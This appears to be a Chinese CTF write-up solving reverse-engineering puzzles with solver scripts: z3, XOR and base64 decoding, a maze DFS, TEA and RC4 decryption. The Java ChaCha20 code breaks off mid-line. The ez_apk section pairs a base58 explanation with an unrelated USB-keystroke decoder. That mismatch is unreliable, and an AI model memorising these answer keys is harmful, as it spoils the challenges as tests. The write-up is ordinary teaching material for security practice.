[WEEK1]signin\n\nIDA打开后直接\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.zvde9hyzyog.png)\n\n\n\n### [WEEK1]easy_math\n\n直接z3约束求解即可\n\n``` python\nfrom z3 import *\n\n# 创建一个符号变量数组l，包含6个整数变量\nl = [Int('l%d' % i) for i in range(6)]\n\n# 创建一个Z3求解器\nsolver = Solver()\n\n# 添加方程组\nsolver.add(\n    (593 * l[0] + 997 * l[1] + 811 * l[2] + 258 * l[3] + 829 * l[4] + 532 * l[5]) == 0x5b8e0aef71d34ff43,\n    (605 * l[0] + 686 * l[1] + 328 * l[2] + 602 * l[3] + 695 * l[4] + 576 * l[5]) == 0x551a262360964ef7f,\n    (373 * l[0] + 512 * l[1] + 449 * l[2] + 756 * l[3] + 448 * l[4] + 580 * l[5]) == 0x49d158a5657d6931c,\n    (560 * l[0] + 635 * l[1] + 422 * l[2] + 971 * l[3] + 855 * l[4] + 597 * l[5]) == 0x625568d5abbabf4f3,\n    (717 * l[0] + 507 * l[1] + 388 * l[2] + 925 * l[3] + 324 * l[4] + 524 * l[5]) == 0x50ee0c025e70e3c23,\n    (312 * l[0] + 368 * l[1] + 884 * l[2] + 518 * l[3] + 495 * l[4] + 414 * l[5]) == 0x40e735f8aa2815f65\n)\n\n# 检查是否存在解\nif solver.check() == sat:\n    model = solver.model()\n    result = [model[l[i]].as_long() for i in range(6)]\n    print(\"Solution found:\")\n    print(result)\nelse:\n    print(\"No solution found.\")\n\nfor i in range(6):\n    result[i]=hex(result[i])\n    for j in range(7):\n        print(chr(int(result[i][2:][j*2:j*2+2],16)),end='')\n```\n\n### [WEEK1]ez_apk\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1p56go1mdb0g.png)\n\n我们分析代码，发现了加密函数，这段时一个base58的码表转换，但最后直接给了加密后的码表\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1t2a0v5wtabk.webp)\n\n我们在mainactivity中点击smail代码，找到原始数据，直接base58换表解密即可\n\nx mappings = { 0x04:\"A\",  0x05:\"B\",  0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\",  0x0B:\"H\", 0x0C:\"I\",  0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\",  0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\",  0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"\\n\", 0x2a:\"[DEL]\",  0X2B:\"    \", 0x2C:\" \",  0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\",  0x30:\"]\",  0x31:\"\\\\\", 0x32:\"~\", 0x33:\";\",  0x34:\"'\", 0x36:\",\",  0x37:\".\" }nums = []keys = open('usbdata.txt')for line in keys:    if line[0]!='0' or line[1]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0':         continue    nums.append(int(line[6:8],16))keys.close()output = \"\"for n in nums:    if n == 0 :        continue    if n in mappings:        output += mappings[n]    else:        output += '[unknown]'print('output :\\n' + output)​# output :# SEC2ETK3YPython\n\n\n\n### [WEEK2]pycode\n\n直接gpt将py字节码转换成普通的代码形式\n\n``` python\nimport base64\n\nflag = '*******************'\nvalue = ''\noutput = ''\n\nfor i in range(1000):\n    w = 1024\n    x = w % 3\n    y = w // 9\n    z = x * y\n    w -= z\n    \nfor i in range(10000):\n    w = 20\n    x = w % 6\n    y = w // 3\n    z = x * y\n    w += z\n\nfor i in range(1000):\n    w = 1024\n    x = w % 3\n    y = w // 9 \n    z = x * y\n    w -= z\n    \nfor i in range(10000):\n    w = 20\n    x = w % 6\n    y = w // 3\n    z = x * y \n    w += z\n    \nfor i in range(len(flag)):\n    temp = flag[i]\n    temp = chr(ord(temp) ^ 8)\n    value += temp\n    \nfor i in range(len(flag)):\n    temp = value[i]\n    temp = chr(ord(temp) + 3)\n    output += temp\n    \nobfuscated_output = base64.b64encode(output.encode()).decode()\nobfuscated_output = obfuscated_output[:-1]\nobfuscated_output = obfuscated_output.replace('0', 't')\nobfuscated_output = obfuscated_output.replace('c', '4')\nobfuscated_output = obfuscated_output.replace('+', '-')\nprint(obfuscated_output)\n```\n\n我们可以看到前面基本都是混淆的，我们只需要从后往前慢慢还原就好了\n\n``` python\nimport base64\na='==AeAF3M-tzO-giQ-AUQosDQ9tGK7MDPuhC47tDNB5Tb8Yn4sdW4'\n\na=a.replace('t','0')\na=a.replace('4','c')\na=a.replace('-','+')\n\na=a[::-1]\na=base64.decodebytes(a.encode('utf-8'))\na=a.decode('utf-8')\na=list(a)\n\nfor i in range(len(a)):\n    a[i]=(ord(a[i])-3)^8\n    print(chr(a[i]),end='')\n```\n\n\n\n### [WEEK2]Authur's_box\n\n\n\n``` python\na=[0xAD,0xA7,0xAA,0xAC,0xB0,0xF8,0xA8,0xFE,0xAF,0xFF,0xF3,0xA9,0xA8,0xE6,0xFF,0xFE,0xF2,0xFE,0xE6,0xFF,0xFC,0xF2,0xAD,0xE6,0xA9,0xFD,0xFF,0xF9,0xE6,0xA8,0xAD,0xA8,0xF2,0xA8,0xAD,0xFD,0xF3,0xAF,0xF3,0xAD,0xFA,0xB0]\n\nfor i in range(len(a)):\n    a[i]=a[i]^0xcb\n    print(chr(a[i]),end='')\n```\n\n### [WEEK2]签到题？\n\n这个题做的我有点懵逼，该说不说确实是签到\n\n直接动调取值，取出值后直接base64解密就得出flag了\n\n![image-20231031124243081](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231031124243081.png)\n\n![image-20231031124515480](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231031124515480.png)\n\n### [WEEK2]not gcc\n\n[clang llc llvm 常用编译指令-CSDN博客](https://blog.csdn.net/pc153262603/article/details/89553688)\n\n[2021CISCN-逆向-baby.bc-部分知识点总结 - re0juren - 博客园 (cnblogs.com)](https://www.cnblogs.com/ren-ctfnote/p/14948764.html)\n\n```\nclang baby.bc -o baby\n```\n\n直接用命令把.bc文件编译成可执行文件，然后开始操作。分析代码\n\n我们分析代码发现关键函数是sudoku函数,代码逻辑就是我们输入正确的81位数独的值，然后他把他提供的数独的值置为0，然后把未知的置为我们求出来的数独的值（有点绕）\n\n``` c\n__int64 __fastcall Sudoku(char *a1)\n{\n  int v2; // [rsp+8h] [rbp-1Ch]\n  int j; // [rsp+Ch] [rbp-18h]\n  int i; // [rsp+10h] [rbp-14h]\n\n  for ( i = 0; i < 9; ++i )\n  {\n    for ( j = 0; j < 9; ++j )\n    {\n      v2 = *a1;\n      if ( map[9 * i + j] )\n      {\n        if ( v2 != 48 )\n          return 0;\n      }\n      else\n      {\n        map[9 * i + j] = v2;\n      }\n    }\n  }\n  return 1;\n}\n\n```\n\n\n\n是个数独的题目，我们提取map里的值，然后去在线解数独的网站进行解密，然后我们分析上述的代码逻辑，根据他的代码逻辑对我们原本的map的值进行修改，就是最后我们要输出的答案\n\n![image-20231031125334209](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231031125334209.png)\n\n那么我们直接异或就可以了，相同的值异或是0，不同的值异或0也是原本的值\n\n``` python\nimport hashlib\n\na=\"407003208500020900012980004709104800061000470003270006086300040020740630304002000\"\nb=\"497513268538426917612987354759164823261839475843275196986351742125748639374692581\"\nc=''\nfor i in range(len(a)):\n   c+=str(int(a[i])^int(b[i]))\n  #  print(int(a[i])^int(b[i]),end='')\n# print(c)\n# 090510060038406017600007350050060023200839005840005190900051702105008009070690581\nd=hashlib.md5()\nd.update(b'090510060038406017600007350050060023200839005840005190900051702105008009070690581')\nprint(d.hexdigest())\n```\n\n### [WEEK2]Run?润！\n\n迷宫题目，学习了一下数据结构中的DFS和BFS算法，提供地图一键解出路径，学习了如何调试出地图\n\n[微信公众平台 (qq.com)](https://mp.weixin.qq.com/s/T6ML7zwA57JXTRwOZqcxhw?spm=a2c6h.12873639.article-detail.7.19f31041PU5YhX)\n\n[CTF-Reverse 迷宫地图类题目分析‘‘DFS和BFS算法‘‘（学习笔记）【详】-CSDN博客](https://blog.csdn.net/Sciurdae/article/details/133963882)\n\n[SHCTF2023 山河CTF Reverse方向week2全WP【详解】-CSDN博客](https://blog.csdn.net/Sciurdae/article/details/133964592)\n\n分析代码，我们看到sub_401A26();就是我们的地图生成函数，我们看到他的调用情况，最一开始调用了一次，然后后续的走迷宫的过程中又生成了一次\n\n``` c\n_DWORD *sub_401A26()\n{\n  int v0; // eax\n  __int64 v1; // rdx\n  _DWORD *result; // rax\n  int j; // [rsp+4h] [rbp-Ch]\n  int i; // [rsp+8h] [rbp-8h]\n  int v5; // [rsp+Ch] [rbp-4h]\n\n  v5 = 0;\n  for ( i = 0; i <= 1; ++i )\n  {\n    for ( j = 31; j >= 0; --j )\n    {\n      v0 = v5++;\n      v1 = v0;\n      result = dword_408060;\n      dword_408060[v1] = (dword_404020[2 * dword_408040 + i] >> j) & 1;\n    }\n  }\n  return result;\n}\n```\n\n\n\n![image-20231031181941311](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231031181941311.png)\n\nv8 = sub_401AAF(v8, Str[i]);是我们的主函数，我们分析其中的代码可以分析出这是3维迷宫,u和q就是控制的三维迷宫的xyz中的x（层），他们使用一次是加减64，同时dword_408040记录的就是我们当初的层数，可以看到调用u和q的时候他会加减变化，初始值为0，w和s是控制的xyz中的y，就是每层的行数，a和d就是控制的z，每一数据具体的列数\n\n``` c\n__int64 __fastcall sub_401AAF(int a1, char a2)\n{\n  int v3; // [rsp+30h] [rbp+10h]\n\n  switch ( a2 )\n  {\n    case 'a':\n      v3 = a1 - 1;\n      goto LABEL_12;\n    case 'd':\n      v3 = a1 + 1;\n      goto LABEL_12;\n    case 'q':\n      v3 = a1 - 64;\n      if ( --dword_408040 < 0 )\n      {\n        puts(\"You crossed the line!Get out of here!\");\n        exit(0);\n      }\n      goto LABEL_11;\n    case 's':\n      v3 = a1 + 8;\n      goto LABEL_12;\n    case 'u':\n      v3 = a1 + 64;\n      if ( ++dword_408040 > 7 )\n      {\n        puts(\"You crossed the line!Get out of here!\");\n        exit(0);\n      }\nLABEL_11:\n      sub_401A26();\n      goto LABEL_12;\n    case 'w':\n      v3 = a1 - 8;\nLABEL_12:\n      if ( v3 > 511 )\n        goto LABEL_16;\n      if ( dword_408060[v3] )\n      {\n        dword_408044 = 1;\n        puts(\"You crossed the line!Get out of here!\");\n        exit(0);\n      }\n      return (unsigned int)v3;\n    default:\nLABEL_16:\n      puts(\"You crossed the line!Get out of here!\");\n      exit(0);\n  }\n}\n```\n\n我们分析完了源码接下来就是思考如何获取迷宫，我们采用动调的方式进行取值，我们输入很多u，让他每次判断都是往u的判断里走，因为我们要让dword_408040的值变化，因为生成迷宫的函数中就是根据这个的值进行变化的，然后每次他都会调用一下sub_401A26(),生成对应层的迷宫，调用完了后，我们手动把RIP的值改成0x0000000000401B0F，让他再次进入u这个case判断中，对dword_408040进行自加1，然后继续调用sub_401A26，直到最后dword_408040的值大于7位置，我们到目前也能判断出他是8x8x8的三维迷宫\n\n![image-20231031182756375](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231031182756375.png)\n\n调试出了迷宫后我们就可以使用脚本，或者自己读出我们的路径了\n\n``` python\nmaze = [0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1,\n        1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n        1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n        1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n        1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n        1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n        1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1,\n        1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1,\n        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0,\n        1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1,\n        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1,\n        1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1,\n        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n        1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 2]\n\n\n# maze[x * 64 + y * 8 + z]\ndef check_point_valid(map, x, y, z):\n    if (x >= 0) and (x <= 7) and (y >= 0) and (y <= 7) and (z >= 0) and (z <= 7):\n        return (map[x * 64 + y * 8 + z] != 1) and ((map[x * 64 + y * 8 + z] == 0) or (map[x * 64 + y * 8 + z] == 2))\n    else:\n        return False\n\n\ndef gen_nex(map, x, y, z):\n    all_dir = []\n    if check_point_valid(map, x - 1, y, z):\n        all_dir.append((x - 1, y, z, 'q'))\n    if check_point_valid(map, x + 1, y, z):\n        all_dir.append((x + 1, y, z, 'u'))\n    if check_point_valid(map, x, y - 1, z):\n        all_dir.append((x, y - 1, z, 'w'))\n    if check_point_valid(map, x, y + 1, z):\n        all_dir.append((x, y + 1, z, 's'))\n    if check_point_valid(map, x, y, z - 1):\n        all_dir.append((x, y, z - 1, 'a'))\n    if check_point_valid(map, x, y, z + 1):\n        all_dir.append((x, y, z + 1, 'd'))\n    print(all_dir)\n    return all_dir\n\n\ndef check_success(map, x, y, z):\n    if map[x * 64 + y * 8 + z] == 2:\n        return True\n    else:\n        return False\n\n\ndef dfs(mapb, x, y, z, path):\n    map = mapb.copy()\n    if map[x * 64 + y * 8 + z] != 2:\n        map[x * 64 + y * 8 + z] = 1\n    if check_success(map, x, y, z):\n        print(path)\n        return True\n\n    next_point = gen_nex(map, x, y, z)\n    for n in next_point:\n        pathn = path + n[3]\n        dfs(map, n[0], n[1], n[2], pathn)\n\n\noutpus = \"\"\ndfs(maze, 0, 0, 0, outpus)\n```\n\n> ssdddssuuuwwwwqqqdddduussaauuuaaaaassssqddddddduuwwwaasusssdd\n\n我们分析最后的函数，可以直接通过动调获取flag\n\n![image-20231031183240426](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231031183240426.png)\n\n\n\n### [WEEK3]ststst\n\nSMC加tea\n\n我们分析代码，可以看到有一段修改内存的函数，以及赋予内存修改权限的mprotect，我们猜测这就是SMC的自解密\n\n``` c\nint sub_400763()\n{\n  int i; // [rsp+Ch] [rbp-14h]\n\n  mprotect(&dword_400000, 0x1000uLL, 7);\n  for ( i = 0; i < (sub_400763 - sub_400696); ++i )\n    *(sub_400696 + i) ^= 0xC3u;\n  return mprotect(&dword_400000, 0x1000uLL, 5);\n}\n```\n\n直接动调，然后选中全部的数据按u，然后选中函数头按c和p，就可以编译成一个完整的函数,我们可以看到是一个魔改tea加密，他修改了sum的值，我们用别人的脚本跑一下就行\n\n``` c\n__int64 __fastcall sub_400696(unsigned int *a1, _DWORD *key)\n{\n  __int64 result; // rax\n  unsigned int v0; // [rsp+10h] [rbp-10h]\n  unsigned int v1; // [rsp+14h] [rbp-Ch]\n  int sum; // [rsp+18h] [rbp-8h]\n  unsigned int i; // [rsp+1Ch] [rbp-4h]\n\n  v0 = *a1;\n  v1 = a1[1];\n  sum = 0;\n  for ( i = 0; i <= 31; ++i )\n  {\n    sum -= 0x61C88647;\n    v0 += (v1 + sum) ^ (16 * v1 + *key) ^ ((v1 >> 5) + key[1]);\n    v1 += (v0 + sum) ^ (16 * v0 + key[2]) ^ ((v0 >> 5) + key[3]);\n  }\n  *a1 = v0;\n  result = v1;\n  a1[1] = v1;\n  return result;\n}\n```\n\n[浅析C语言之uint8_t / uint16_t / uint32_t /uint64_t-CSDN博客](https://blog.csdn.net/mary19920410/article/details/71518130)\n\n``` c\n#include <stdio.h>\n#include <stdint.h>\n#include <stdlib.h>\nint delta = 0x61C88647;\nvoid decrypt(uint32_t* v, uint32_t* k) {\n\tuint32_t v3 = v[0];\n\tuint32_t v4 = v[1];\n\tuint32_t sum = ((32 * (-delta)) & 0xffffffff);\n\tint i = 0;\n\tfor (i = 0; i <= 31; i++) {\n\t\tv4 -= (v3 + sum) ^ (16 * v3 + k[2]) ^ ((v3 >> 5) + k[3]);\n\t\tv3 -= (v4 + sum) ^ (16 * v4 + k[0]) ^ ((v4 >> 5) + k[1]);\n\t\tsum += 0x61C88647;\n\t}\n\tv[0] = v3;\n\tv[1] = v4;\n}\nint main() {\n\tuint32_t key[4] = { 0x01234567, 0x89ABCDEF, 0xFEDCBA98, 0x76543210 };\n\tuint32_t array[8] = { 0xDB8F2569, 0x40CD83E3, 0xA033E680, 0xFFF7A644,\n\t0x690C3A17, 0xB621B866, 0x34E7E2A7, 0xAD10A692 }; //密码数据\n\tuint32_t temp[2] = { 0 };\n\tint i = 0;\n\tfor (i = 0; i <= 7; i += 2) {\n\t\ttemp[0] = array[i];\n\t\ttemp[1] = array[i + 1];\n\t\tdecrypt(temp, key);\n\t\tprintf(\"%c%c%c%c%c%c%c%c\", *((char*)&temp[0] + 0), *((char*)&temp[0] +\n\t\t\t1), *((char*)&temp[0] + 2), *((char*)&temp[0] + 3), *((char*)&temp[1] + 0), *\n\t\t\t((char*)&temp[1] + 1), *((char*)&temp[1] + 2), *((char*)&temp[1] + 3));\n\t}\n\treturn 0;\n}\n```\n\n### [WEEK3]easyre\n\n开局一个exe文件，和之前的不同，我们用die看了后是用py打包的，那么我们就解包，反编译\n\n> python pyinstxtractor-ng.py 1.exe\n> uncompyle6 main.pyc > main.py\n\n我们把其中的main.pyc转换成py代码\n\n![image-20231031212031065](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231031212031065.png)\n\n用gpt得出他的xor的值是23,我们根据他的代码逻辑，他就会执行一个程序，但我们看不到我们需要的代码\n\n``` python\nimport base64\nimport marshal\nfrom dis import dis\n\nencoded_data = b'...'\n\n\nxor_decoded_data = bytes([byte ^ 23 for byte in encoded_data])\ndecoded_data = base64.b64decode(xor_decoded_data)\ncode_obj = marshal.loads(decoded_data)\nexce(code_obj)\n```\n\n>  exec 是 Python 中的一个内置函数，用于执行动态生成的 Python 代码。这个函数接受一个代码对象（通常是由字符串形式的代码或者编译后的字节码构建而成），并执行其中的 Python 语句exec 是 Python 中的一个内置函数，用于执行动态生成的 Python 代码。\n\n重点，接受一个代码对象，通常是由字符串形式的代码或者编译后的字节码构建而成。\n\n而且前面marshal.loads(decoded_data) 反序列化从某种格式编码的代码。所以现在的encode其实是类似于字节码的存在？因此我们可以直接用dis模块查看code_obj 中包含的 Python 字节码的信息。\n\n\n\n``` python\nimport base64\nimport marshal\nfrom dis import dis\n\nencoded_data = b'#`VVVVVVVVVVVVVVVVVVVVVSVVVVFVVVV_YZVVVVMVU|VNFV@pU|V{xUMVYvVzBSMVDSVFRVMFDSV\\\\VQMV@\\x7fVAxPMFU{V@BPp`]vU%B_MF]eVy]VMFY|UxZUVFUbTPBSMVrSVFRVMV\\x7fCVT|]N`^VVVVVVVVVVVVVVVpVVVVPVVVVF`VVV_GFVVVVsVU\\'V@FUp`PSVO\\'TMV].V$FUMVPSVBFVOC\".U_`SqV]/UU|VQ`U/V_`RsV]/V^ZUQpVMVUtVMVR@V_\\'SqV]/Vo|VqV]/UU|VVpU/Vy`RGVU/Vy`SGVUoPPFTUVU.U_\\'SsVXSV_\\'QqVQRVQ&pqFM/UPFSQ`U|VENVqFE/V$`TqVFMVUtVMVR@V_\\'SqV]/Vo|VqV]/UU|VVpU/Vy`RGVU/Vy`SGVU/Vy`TqVFMV_`TqVZMVUtVMVR@VU|VqFs/UvVRqVM/U\\'RVxFRUV_QfqVACVT|RCb|VVFVV!FVVVVSgVFVVVT|Q%pEdvOY\\'%pAnN@\"yMsxSuPAb%p{~rOE{NO]nNOyvUzQ`tPAbMT|^%pYeMO{vTOUdN@{bsPA#sYxUB.xUvcxUvAx\\\\N%{`vPAnsPA#sYxRN%\\x7f\\x7ftcxUv!|Vtp/VVVS!UzM&u~\"`rsx[tzZ\\'O%AbN$]\"t_FUVVVVto`VVVVVVF`UUV^ZVDVU_V^^VFNTTVRZVEVUPpRNVEVTt\\x7fRVVVUmT`VVVPA#N@&`uPAqv%A\"tnxVVVSN{U!ez%M\\'!&&VP ez!UZmA.\\'X\"g^\\'/NUcvXd.TPRTTD!&UB\\\\`dT.R}Q{!QQUdr~UguyU&sTU\"u$An^PMdN@t!rpA&sPNcXQxSr@Am@p]bu\\'#gT_^EVVVVtp|VVVUvU@YxM@Ye%pA`tz{bsYxQv@\"`sOCvUzAbN%.|MsxRMzo\\x7fM&x]M@\"}ty{`sPA|tp/VVVUnS`VVV_^GVVVVt\\x7fVVVVSvTSocu%E&uPB<VFVVV_ZFVVVVTUFRVFFTTVRZVpxTTVR\\\\Vp**'\n\n\nxor_decoded_data = bytes([byte ^ 23 for byte in encoded_data])\ndecoded_data = base64.b64decode(xor_decoded_data)\ncode_obj = marshal.loads(decoded_data)\ndis(code_obj)\n\n```\n\n得到字节码后我们直接gpt，转换成正常的py代码，如果gpt是傻子可以尝试第二种方式\n\n``` python\nimport base64\nimport marshal\n\nencoded_data = b'...'\n\nxor_decoded_data = bytes([byte ^ 23 for byte in encoded_data])\n\ndecoded_data = base64.b64decode(xor_decoded_data)\n\nopen(\"new.pyc\",\"wb\").write(decoded_data)\n```\n\n将他写入到一个文件里面，然后现在还识别不出他是pyc文件，我们去直接反编译出的pyc里面，随便偷个头过来，将他修复（上面的一串）\n\n![image-20231031214116370](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231031214116370.png)\n\n然后再uncompyle6 new.pyc > 1.py\n\n``` python\n# uncompyle6 version 3.9.0\n# Python bytecode version base 3.8.0 (3413)\n# Decompiled from: Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:25:05) [MSC v.1500 64 bit (AMD64)]\n# Embedded file name: fun.py\n\n\ndef rc4_encrypt(key, plaintext):\n    S = list(range(256))\n    j = 0\n    for i in range(256):\n        j = (j + S[i] + key[i % len(key)]) % 256\n        S[i], S[j] = S[j], S[i]\n    else:\n        i = j = 0\n        ciphertext = bytearray()\n        for char in plaintext:\n            i = (i + 1) % 256\n            j = (j + S[i]) % 256\n            S[i], S[j] = S[j], S[i]\n            k = S[(S[i] + S[j]) % 256]\n            ciphertext.append(char ^ k)\n        else:\n            print(ciphertext)  #这一段是我自己加的，直接自己调用自己就可以了\n            return ciphertext\n\n\nkey = b'example_key'\ncheck = b'\\xd8\\x94\\x1e\\xab\\x9bft\\xeb]@\\x1b\\xba\\xe6\\xe8\\x133W\\xdd\\x0e\\xe6\\x924\\xf1\\x80mh\\xeb=\\x08a\\x02\\t.\\xb5\\x05B\\xb0\\xb0/D\\x8cY'\nprint('Plz input your flag:')\nflag = input().encode('utf-8')\nencrypted = rc4_encrypt(key, flag)\nif encrypted == check:\n    print('yes')\nelse:\n    print('no')\n# okay decompiling C:\\Users\\a\\Desktop\\new.pyc\n\n```\n\n可以看到就是一个rc4，我们让他自己调用自己就可以解出flag了\n\n![image-20231031214441502](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231031214441502.png)\n\n### [WEEK3]java是最棒的语言吗\n\n将原来的java拷贝下俩，加两处输出，获得密文和密钥，最后异或一下获得flag\n\n``` java\nimport java.nio.charset.StandardCharsets;\nimport java.util.Arrays;\nimport java.util.Scanner;\n\n/* renamed from: ChaCha20  reason: default package */\n/* loaded from: java是最棒的语言吗.class */\npublic class ChaCha20 {\n    public static void main(String[] strArr) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"input your flag:\");\n        String nextLine = scanner.nextLine();\n        if (Arrays.equals(encrypt(nextLine.getBytes(StandardCharsets.UTF_8), \"Shctf_Welcomes_Have_4_good_t1me_\".getBytes(), \"HsehrcOedfgs\".getBytes()), hexStringToBytes(\"ce43283af73d106815fe5293b474f5309d44063c7fde19533300c60603dfe528d19aee2f6db615191e45\"))) {\n            System.out.println(\"right!\");\n        } else {\n            System.out.println(\"error!\");\n        }\n    }\n\n    private static byte[] encrypt(byte[] bArr, byte[] bArr2, byte[] bArr3) {\n        int[] chachaInit = chachaInit(bArr2, bArr3);\n        byte[] bArr4 = new byte[bArr.length];\n        byte[] bArr5 = new byte[64];\n        for (int i = 0; i < bArr.length; i += 64) {\n            chachaBlock(chachaInit, bArr5);\n            for (int i2 = 0; i2 < 64 && i + i2 < bArr.length; i2++) {\n                bArr4[i + i2] = (byte) (bArr[i + i2] ^ bArr5[i2]);\n                System.out.print(bArr5[i2] + \",\"); ##这里是添加的\n            }\n            System.out.println(\"\\n\");\n            chachaInit[12] = chachaInit[12] + 1;\n        }\n        return bArr4;\n    }\n\n    private static int[] chachaInit(byte[] bArr, byte[] bArr2) {\n        int[] iArr = new int[16];\n        iArr[0] = 1634760805;\n        iArr[1] = 857760878;\n        iArr[2] = 2036477234;\n        iArr[3] = 1797285236;\n        for (int i = 0; i < 8; i++) {\n            iArr[4 + i] = bytesToIntLittleEndian(bArr, i * 4);\n        }\n        iArr[12] = 0;\n        iArr[13] = 0;\n        iArr[14] = bytesToIntLittleEndian(bArr2, 0);\n        iArr[15] = bytesToIntLittleEndian(bArr2, 4);\n        return iArr;\n    }\n\n    private static void chachaBlock(int[] iArr, byte[] bArr) {\n        int[] copyOf = Arrays.copyOf(iArr, 16);\n        for (int i = 0; i < 10; i++) {\n            chachaDoubleRound(copyOf);\n        }\n        for (int i2 = 0; i2 < 16; i2++) {\n            intToBytesLittleEndian(iArr[i2] + copyOf[i2], bArr, i2 * 4);\n        }\n    }\n\n    private static void chachaDoubleRound(int[] iArr) {\n        quarterRound(iArr, 0, 4, 8, 12);\n        quarterRound(iArr, 1, 5, 9, 13);\n        quarterRound(iArr, 2, 6, 10, 14);\n        quarterRound(iArr, 3, 7, 11, 15);\n        quarterRound(iArr, 0, 5, 10, 15);\n        quarterRound(iArr, 1, 6, 11, 12);\n        quarterRound(iArr, 2, 7, 8, 13);\n        quarterRound(iArr, 3, 4, 9, 14);\n    }\n\n    private static void quarterRound(int[] iArr, int i, int i2, int i3, int i4) {\n        iArr[i] = iArr[i] + iArr[i2];\n        iArr[i4] = rotateLeft(iArr[i4] ^ iArr[i], 16);\n        iArr[i3] = iArr[i3] + iArr[i4];\n        iArr[i2] = rotateLeft(iArr[i2] ^ iArr[i3], 12);\n        iArr[i] = iArr[i] + iArr[i2];\n        iArr[i4] = rotateLeft(iArr[i4] ^ iArr[i], 8);\n        iArr[i3] = iArr[i3] + iArr[i4];\n        iArr[i2] = rotateLeft(iArr[i2] ^ iArr[i3], 7);\n    }\n\n    private static int rotateLeft(int i, int i2) {\n        return (i << i2) | (i >>> (32 - i2));\n    }\n\n    private static int bytesToIntLittleEndian(byte[] bArr, int i) {\n        return ((bArr[i + 3] & 255) << 24) | ((bArr[i + 2] & 255) << 16) | ((bArr[i + 1] & 255) << 8) | (bArr[i] & 255);\n    }\n\n    private static void intToBytesLittleEndian(int i, byte[] bArr, int i2) {\n        bArr[i2] = (byte) (i & 255);\n        bArr[i2 + 1] = (byte) ((i >>> 8) & 255);\n        bArr[i2 + 2] = (byte) 